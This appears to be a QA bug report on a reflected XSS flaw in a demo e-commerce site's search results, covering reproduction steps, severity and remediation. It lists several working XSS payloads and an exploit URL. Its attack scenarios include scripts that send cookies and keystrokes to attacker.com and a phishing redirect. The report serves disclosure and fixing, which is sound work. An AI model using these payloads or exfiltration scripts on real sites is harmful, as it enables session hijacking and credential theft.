# BUG-002: [Security] XSS Vulnerability in Search Results Page

**Reported By:** Dimitar Prodromov  
**Date:** 2024-12-16  
**Status:** Open  

---

## üìã Bug Summary

| Field | Details |
|-------|---------|
| **Bug ID** | BUG-002 |
| **Title** | Cross-Site Scripting (XSS) vulnerability in search query reflection |
| **Severity** | Critical |
| **Priority** | P1 |
| **Type** | Security - XSS |
| **Component** | Search - Results Display |
| **Reproducibility** | Always (10/10 attempts) |
| **Found In Version** | v2.3.4 |

---

## üåç Environment

| Field | Details |
|-------|---------|
| **URL** | https://demo-ecommerce.example.com/search |
| **Browser** | Chrome 120.0.6099.109, Firefox 121.0 (both vulnerable) |
| **Operating System** | Windows 11 Pro |
| **Device** | Desktop (Lenovo ThinkPad) |
| **Screen Resolution** | 1920x1080 |
| **Test Account** | Not required (public search feature) |

---

## üîç Steps to Reproduce

1. Navigate to homepage: https://demo-ecommerce.example.com
2. Click into search input field in header
3. Enter XSS payload: `<script>alert('XSS')</script>`
4. Press Enter or click Search button
5. Observe that JavaScript executes on search results page

**Alternative payloads that also work:**
- `<img src=x onerror=alert('XSS')>`
- `<svg onload=alert('XSS')>`
- `"><script>alert(document.cookie)</script>`

---

## ‚ùå Actual Result

**JavaScript payload executes on the page:**

1. Search query is reflected unescaped in the page heading
2. Alert box appears with message 'XSS' (or cookie data)
3. Malicious code successfully executes in user's browser
4. Page displays: "Search results for `<script>alert('XSS')</script>`" with script executing

**Vulnerable Code Location (View Source):**
```html
<div class="search-results-header">
  <h1>Search results for '<script>alert('XSS')</script>'</h1>
  <p>0 results found</p>
</div>
```

**Console Output:**
```javascript
// Alert box triggered
// Payload successfully executed in page context
```

**Critical Observations:**
- ‚úÖ XSS executes in main page context (not iframe)
- ‚úÖ Has access to `document.cookie` (can steal session tokens)
- ‚úÖ Has access to localStorage/sessionStorage
- ‚úÖ Can make requests on behalf of user
- ‚úÖ Can redirect user to phishing sites
- ‚úÖ URL with payload can be shared to attack other users

---

## ‚úÖ Expected Result

Search input should be properly sanitized/escaped:

- ‚úÖ User input should be HTML-escaped before display
- ‚úÖ Script tags should render as text: `&lt;script&gt;alert('XSS')&lt;/script&gt;`
- ‚úÖ No JavaScript execution from user input
- ‚úÖ Page displays: "Search results for '&lt;script&gt;alert('XSS')&lt;/script&gt;'"
- ‚úÖ Dangerous characters encoded: `<` ‚Üí `&lt;`, `>` ‚Üí `&gt;`, `"` ‚Üí `&quot;`

**Secure display:**
```html
<div class="search-results-header">
  <h1>Search results for '&lt;script&gt;alert('XSS')&lt;/script&gt;'</h1>
  <p>0 results found</p>
</div>
```

---

## üì∏ Evidence

### Screenshot 1: XSS Alert Box
![Browser alert box showing 'XSS' triggered by malicious payload](#)

### Screenshot 2: Cookie Theft Proof of Concept
![Alert showing document.cookie content including session token](#)

### Screenshot 3: View Source Showing Unescaped HTML
![Browser view source showing raw script tag in HTML](#)

### Console Screenshot
```javascript
// Proof of cookie access
<script>alert(document.cookie)</script>
// Output in alert:
sessionToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; userId=12345; cartId=abc-123
```

### Network Tab
```
Request: GET /search?q=<script>alert('XSS')</script>
Status: 200 OK
Response Time: 892ms

Response HTML (partial):
<h1>Search results for '<script>alert('XSS')</script>'</h1>
         // ^^^ UNESCAPED - VULNERABLE ^^^
```

### URL that exploits vulnerability:
```
https://demo-ecommerce.example.com/search?q=<script>alert(document.cookie)</script>
```
This URL can be shared via email/social media to attack users.

---

## üí• Impact & Business Effect

### Security Impact: CRITICAL

**Attack Scenarios:**

1. **Session Hijacking:**
   ```html
   <script>
     fetch('https://attacker.com/steal?cookie=' + document.cookie);
   </script>
   ```
   Attacker can steal session tokens and impersonate users

2. **Phishing/Redirection:**
   ```html
   <script>
     window.location = 'https://fake-ecommerce.com/login';
   </script>
   ```
   Redirect users to fake login page to steal credentials

3. **Keylogging:**
   ```html
   <script>
     document.addEventListener('keypress', function(e) {
       fetch('https://attacker.com/log?key=' + e.key);
     });
   </script>
   ```
   Capture all user input including passwords

4. **Defacement:**
   ```html
   <script>
     document.body.innerHTML = '<h1>HACKED</h1>';
   </script>
   ```
   Change page content to damage brand reputation

**User Impact:**
- **All users** clicking malicious search links are vulnerable
- Session tokens can be stolen (leads to account takeover)
- Personal information at risk
- Credit card data potentially accessible if stored in localStorage

**Business Impact:**
- **CRITICAL SECURITY BREACH** - potential data breach
- Liability: GDPR/CCPA violations if customer data compromised
- Reputation damage: "Site vulnerable to hackers"
- Financial loss: Potential lawsuits, regulatory fines
- Loss of customer trust
- Possible PCI-DSS compliance failure (if payment data accessed)

**Vulnerability Rating (CVSS):**
- Base Score: **7.1 (High)**
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: None
- User Interaction: Required (click malicious link)
- Scope: Changed
- Impact: Confidentiality (High), Integrity (Low), Availability (None)

---

## üîÑ Reproducibility

- **Frequency:** 10 out of 10 attempts (100% - Always)
- **Conditions:** 
  - Any user (logged in or anonymous)
  - All browsers tested vulnerable (no XSS filters in modern browsers)
  - Desktop and mobile both affected
  - Works with any XSS payload type (script, img, svg, etc.)
- **Affected browsers:** Chrome ‚úì, Firefox ‚úì, Safari ‚úì (likely)
- **Affected devices:** Desktop ‚úì, Mobile ‚úì

**XSS Payloads Tested (All successful):**
| Payload | Result |
|---------|--------|
| `<script>alert('XSS')</script>` | Executes ‚úÖ |
| `<img src=x onerror=alert(1)>` | Executes ‚úÖ |
| `<svg onload=alert(1)>` | Executes ‚úÖ |
| `"><script>alert(1)</script>` | Executes ‚úÖ |
| `<iframe src="javascript:alert(1)">` | Executes ‚úÖ |
| `<body onload=alert(1)>` | Executes ‚úÖ |

---

## üõ† Workaround

**No effective user workaround exists.**

Users cannot protect themselves from clicking malicious links sent by attackers.

**Temporary mitigation (requires code change):**
- Implement input sanitization immediately
- Add Content Security Policy (CSP) headers as defense-in-depth

---

## üìù Additional Notes

**Root Cause:**
- Search query parameter `q` directly inserted into HTML without escaping
- No input validation or output encoding
- Missing Content Security Policy (CSP) headers

**Vulnerable Code Pattern (suspected):**
```javascript
// Backend (Node.js/Express) - VULNERABLE
app.get('/search', (req, res) => {
  const query = req.query.q; // Untrusted user input
  res.send(`<h1>Search results for '${query}'</h1>`); // Direct insertion - UNSAFE
});

// Should be:
const escapeHtml = require('escape-html');
const safeQuery = escapeHtml(query);
res.send(`<h1>Search results for '${safeQuery}'</h1>`);
```

**Recommended Fix (Priority Order):**

1. **Immediate (Required):**
   - HTML-escape all user input before rendering:
     ```javascript
     function escapeHtml(unsafe) {
       return unsafe
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
     }
     ```
   - Use templating engine with auto-escaping (e.g., React, Vue, EJS with `<%=`)

2. **Short-term (Defense in depth):**
   - Implement Content Security Policy headers:
     ```
     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
     ```
   - Add `X-XSS-Protection: 1; mode=block` header (legacy browsers)

3. **Long-term (Best practice):**
   - Input validation: Reject suspicious patterns
   - Regular security audits
   - Implement Web Application Firewall (WAF)
   - Security training for developers

**OWASP Reference:**
- Vulnerability: **A03:2021 ‚Äì Injection** (OWASP Top 10)
- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

**Related Test Cases:**
- TC-006 (Basic search) - Found during TC-006 execution
- TC-008 (Empty results) - Also tested for XSS, same vulnerability
- TC-005 (SQL injection) - Different vulnerability, but login form properly protected

**Related Bugs:**
- None currently

**Other Search Features Tested:**
- ‚úÖ Product titles: Properly escaped (safe)
- ‚úÖ Product descriptions: Properly escaped (safe)
- ‚ùå Search query display: VULNERABLE (this bug)
- ‚úÖ Filter parameters: Properly escaped (safe)

**Additional Vulnerable Endpoints Found:**
- `/search?q=<payload>` - VULNERABLE ‚ö†Ô∏è
- `/search/suggestions?q=<payload>` - Safe (JSON response, proper content-type)

---

## üö® Disclosure

This vulnerability was found during legitimate security testing. 

**Responsible Disclosure:**
- Not publicly disclosed
- Not exploited maliciously
- Reported privately to development team
- No user data accessed or exfiltrated
- Testing performed on personal test account only

**Recommendation:** Treat as **P1 Critical** - fix within 24-48 hours.

---

**Report Status:** Open - URGENT  
**Assigned To:** Security Team / Backend Team  
**Target Fix Version:** v2.3.5 (HOTFIX - Emergency)  
**Estimated Fix Time:** 4-8 hours (implement escaping + testing)  
**Security Advisory:** To be issued after patch deployment
